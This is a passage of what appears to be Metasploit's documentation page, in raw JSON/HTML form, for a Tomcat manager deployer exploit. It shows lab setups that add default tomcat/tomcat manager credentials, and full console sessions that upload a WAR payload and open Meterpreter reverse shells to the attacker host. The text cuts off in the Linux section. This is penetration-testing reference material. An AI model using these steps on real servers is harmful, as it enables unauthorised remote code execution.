{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/tomcat_mgr_deploy","result":{"data":{"moduleMetadataJson":{"id":"5aa08c85-9de6-553b-9891-ee7c37a19a40","name":"Apache Tomcat Manager Application Deployer Authenticated Code Execution","fullname":"exploit/multi/http/tomcat_mgr_deploy","description":"This module can be used to execute a payload on Apache Tomcat servers that\n        have an exposed \"manager\" application. The payload is uploaded as a WAR archive\n        containing a jsp application using a PUT request.\n\n        The manager application can also be abused using /manager/html/upload, but that\n        method is not implemented in this module.\n\n        NOTE: The compatible payload sets vary based on the selected target. For\n        example, you must select the Windows target to use native Windows payloads.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/tomcat_mgr_deploy","documentationSlug":"/modules/documentation/exploit/multi/http/tomcat_mgr_deploy","referencesSlug":"/modules/references/exploit/multi/http/tomcat_mgr_deploy"},"documentation":{"html":"<h1 id=\"documentation-format\" style=\"position:relative;\"><a href=\"#documentation-format\" aria-label=\"documentation format permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Documentation Format</h1>\n<p>This documentation is slightly different from the standard module documentation due to the variation in variables/privileges/versions that can affect how exploitation happens.\nThis documentation is broken down by OS, Tomcat version, then privilege to show exploitation in each variation.</p>\n<h1 id=\"cleanup\" style=\"position:relative;\"><a href=\"#cleanup\" aria-label=\"cleanup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cleanup</h1>\n<p>It should be stated outright that the exploit MAY NOT undeploy the shellcode from Tomcat.  This can be done <a href=\"#manual-cleanup\">manually</a>.</p>\n<h1 id=\"tomcatmgrupload\" style=\"position:relative;\"><a href=\"#tomcatmgrupload\" aria-label=\"tomcatmgrupload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>tomcat<em>mgr</em>upload</h1>\n<p>This module is VERY similar to <code class=\"language-text\">exploit/multi/http/tomcat_mgr_upload</code>, the main difference is this uses a <code class=\"language-text\">PUT</code> HTTP request, instead of going through a <code class=\"language-text\">POST</code> HTTP request through the GUI.</p>\n<h2 id=\"windows-xp-sp2\" style=\"position:relative;\"><a href=\"#windows-xp-sp2\" aria-label=\"windows xp sp2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows (xp sp2)</h2>\n<h3 id=\"tomcat-6-6048\" style=\"position:relative;\"><a href=\"#tomcat-6-6048\" aria-label=\"tomcat 6 6048 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat 6 (6.0.48)</h3>\n<h4 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Download and install the pre-req <a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jre7-downloads-1880261.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Java7</a></li>\n<li>Download and install <a href=\"http://apache.osuosl.org/tomcat/tomcat-6/v6.0.48/bin/apache-tomcat-6.0.48.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Tomcat6</a></li>\n</ol>\n<p>The install was default, other than adding a user during install.  No other options were changed.  The install assgined the new user the role <code class=\"language-text\">manager-gui</code>, which is Tomcat 7+ syntax.\nFor this exploitation, it was changed to simply <code class=\"language-text\">manager</code>.</p>\n<h4 id=\"exploitation\" style=\"position:relative;\"><a href=\"#exploitation\" aria-label=\"exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">C:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\tomcat-users.xml</code> to add the following under the <code class=\"language-text\">&lt;tomcat-users&gt;</code> line:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart Tomcat service</li>\n<li>\n<p>Exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_deploy\nmsf exploit(tomcat_mgr_deploy) &gt; set rhost 192.168.2.108\nrhost =&gt; 192.168.2.108\nmsf exploit(tomcat_mgr_deploy) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_deploy) &gt; set payload java/meterpreter/reverse_tcp\npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_deploy) &gt; set target 1\ntarget =&gt; 1\nmsf exploit(tomcat_mgr_deploy) &gt; set rport 8086\nrport =&gt; 8086\nmsf exploit(tomcat_mgr_deploy) &gt; set path /manager\npath =&gt; /manager\nmsf exploit(tomcat_mgr_deploy) &gt; check\n[*] 192.168.2.108:8086 The target appears to be vulnerable.\nmsf exploit(tomcat_mgr_deploy) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using manually select target &quot;Java Universal&quot;\n[*] Uploading 6071 bytes as scEYoK0.war ...\n[!] No active DB -- Credential data will not be saved!\n[*] Executing /scEYoK0/jgj6tWcImjhc7rH2F4TDjCpXG.jsp...\n[*] Undeploying scEYoK0 ...\n[*] Sending stage (49409 bytes) to 192.168.2.108\n[*] Meterpreter session 2 opened (192.168.2.117:4444 -&gt; 192.168.2.108:1663) at 2017-01-14 14:30:52 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : winxp\nOS          : Windows XP 5.1 (x86)\nMeterpreter : java/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"tomcat-7-7073\" style=\"position:relative;\"><a href=\"#tomcat-7-7073\" aria-label=\"tomcat 7 7073 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat 7 (7.0.73)</h3>\n<p>Of note, as of Tomcat 7, the permission role <code class=\"language-text\">manager</code> has been divided into several sub-roles.  Each sub role the user has will change which <code class=\"language-text\">path</code> variable for exploitation.</p>\n<h4 id=\"setup-1\" style=\"position:relative;\"><a href=\"#setup-1\" aria-label=\"setup 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Download and install the pre-req <a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jre7-downloads-1880261.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Java7</a></li>\n<li>Download and install <a href=\"http://apache.osuosl.org/tomcat/tomcat-7/v7.0.73/bin/apache-tomcat-7.0.73.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Tomcat7</a></li>\n</ol>\n<p>The install was default, other than adding a user during install.  No other options were changed.\nOf note, the user was given <code class=\"language-text\">manager-gui</code> permissions by default.</p>\n<h4 id=\"textscript-interface-exploitation\" style=\"position:relative;\"><a href=\"#textscript-interface-exploitation\" aria-label=\"textscript interface exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>text/script Interface Exploitation</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">C:\\Program Files\\Apache Software Foundation\\Tomcat 7.0\\tomcat-users.xml</code> to add the following under the <code class=\"language-text\">&lt;tomcat-users&gt;</code> line:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager-script&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-script&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart the service</li>\n<li>\n<p>Exploitation:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_deploy\nmsf exploit(tomcat_mgr_deploy) &gt; set rhost 192.168.2.108\nrhost =&gt; 192.168.2.108\nmsf exploit(tomcat_mgr_deploy) &gt; set path /manager/text\npath =&gt; /manager/text\nmsf exploit(tomcat_mgr_deploy) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_deploy) &gt; set rport 8087\nrport =&gt; 8087\nmsf exploit(tomcat_mgr_deploy) &gt; set payload java/meterpreter/reverse_tcp\npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_deploy) &gt; set target 1\ntarget =&gt; 1\nmsf exploit(tomcat_mgr_deploy) &gt; check\n[*] 192.168.2.108:8087 The target appears to be vulnerable.\nmsf exploit(tomcat_mgr_deploy) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using manually select target &quot;Java Universal&quot;\n[*] Uploading 6086 bytes as Cl6t6gurtwIO59zV3Lt6.war ...\n[!] No active DB -- Credential data will not be saved!\n[*] Executing /Cl6t6gurtwIO59zV3Lt6/qTIP.jsp...\n[*] Undeploying Cl6t6gurtwIO59zV3Lt6 ...\n[*] Sending stage (49409 bytes) to 192.168.2.108\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -&gt; 192.168.2.108:1656) at 2017-01-14 14:27:21 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : winxp\nOS          : Windows XP 5.1 (x86)\nMeterpreter : java/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"tomcat-8-8039\" style=\"position:relative;\"><a href=\"#tomcat-8-8039\" aria-label=\"tomcat 8 8039 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat 8 (8.0.39)</h3>\n<p>Of note, as of Tomcat 7, the permission role <code class=\"language-text\">manager</code> has been divided into several sub-roles.  Each sub role the user has will change which <code class=\"language-text\">path</code> variable for exploitation.</p>\n<h4 id=\"setup-2\" style=\"position:relative;\"><a href=\"#setup-2\" aria-label=\"setup 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Download and install the pre-req <a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jre7-downloads-1880261.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Java7</a></li>\n<li>Download and install <a href=\"http://apache.osuosl.org/tomcat/tomcat-8/v8.0.39/bin/apache-tomcat-8.0.39.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Tomcat8</a></li>\n</ol>\n<p>The install was default, other than adding a user during install.  No other options were changed.\nOf note, the user was given <code class=\"language-text\">manager-gui</code> permissions by default.</p>\n<h4 id=\"textscript-interface-exploitation-1\" style=\"position:relative;\"><a href=\"#textscript-interface-exploitation-1\" aria-label=\"textscript interface exploitation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>text/script Interface Exploitation</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">C:\\Program Files\\Apache Software Foundation\\Tomcat 8.0\\tomcat-users.xml</code> to add the following under the <code class=\"language-text\">&lt;tomcat-users</code> line:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager-script&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-script&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart the service</li>\n<li>\n<p>Exploitation:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_deploy\nmsf exploit(tomcat_mgr_deploy) &gt; set rhost 192.168.2.108\nrhost =&gt; 192.168.2.108\nmsf exploit(tomcat_mgr_deploy) &gt; set rport 8088\nrport =&gt; 8088\nmsf exploit(tomcat_mgr_deploy) &gt; set payload java/meterpreter/reverse_tcp\npayload =&gt; java/meterpreter/reverse_tcp\nmsf exploit(tomcat_mgr_deploy) &gt; set lhost 192.168.2.117\nlhost =&gt; 192.168.2.117\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpPassword tomcat\nHttpPassword =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set HttpUsername tomcat\nHttpUsername =&gt; tomcat\nmsf exploit(tomcat_mgr_deploy) &gt; set target 1\ntarget =&gt; 1\nmsf exploit(tomcat_mgr_deploy) &gt; exploit\nmsf exploit(tomcat_mgr_deploy) &gt; set path /manager/text\npath =&gt; /manager/text\nmsf exploit(tomcat_mgr_deploy) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.2.117:4444\n[*] Using manually select target &quot;Java Universal&quot;\n[*] Uploading 6085 bytes as c6TYmkd8YAe8LqKQhSCr.war ...\n[*] Executing /c6TYmkd8YAe8LqKQhSCr/PtW1uMsYCIFP1gs16PUiwE7oc.jsp...\n[*] Undeploying c6TYmkd8YAe8LqKQhSCr ...\n[*] Sending stage (49409 bytes) to 192.168.2.108\n[*] Meterpreter session 1 opened (192.168.2.117:4444 -&gt; 192.168.2.108:1196) at 2017-01-14 10:24:52 -0500\n\nmeterpreter &gt; sysinfo\nComputer    : winxp\nOS          : Windows XP 5.1 (x86)\nMeterpreter : java/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h2 id=\"linux\" style=\"position:relative;\"><a href=\"#linux\" aria-label=\"linux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Linux</h2>\n<h3 id=\"tomcat6-6039---ubuntu-server-1404-64bit\" style=\"position:relative;\"><a href=\"#tomcat6-6039---ubuntu-server-1404-64bit\" aria-label=\"tomcat6 6039   ubuntu server 1404 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tomcat6 (6.0.39) - Ubuntu server 14.04 64bit</h3>\n<h4 id=\"setup-3\" style=\"position:relative;\"><a href=\"#setup-3\" aria-label=\"setup 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h4>\n<ol>\n<li>Install Tomcat and dependencies: <code class=\"language-text\">sudo apt-get install tomcat6 tomcat6-admin</code></li>\n</ol>\n<h4 id=\"exploit\" style=\"position:relative;\"><a href=\"#exploit\" aria-label=\"exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit</h4>\n<ol>\n<li>\n<p>Edit <code class=\"language-text\">/etc/tomcat6/tomcat-users.xml</code> to add the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;role rolename=&quot;manager&quot;/&gt;\n&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager&quot;/&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Restart Tomcat: <code class=\"language-text\">sudo service tomcat6 restart</code></li>\n<li>\n<p>Exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/tomcat_mgr_deploy\nmsf exploit(tomcat_mgr_deploy) &gt; set rhost 192.168.2.156\nrhost =&gt; 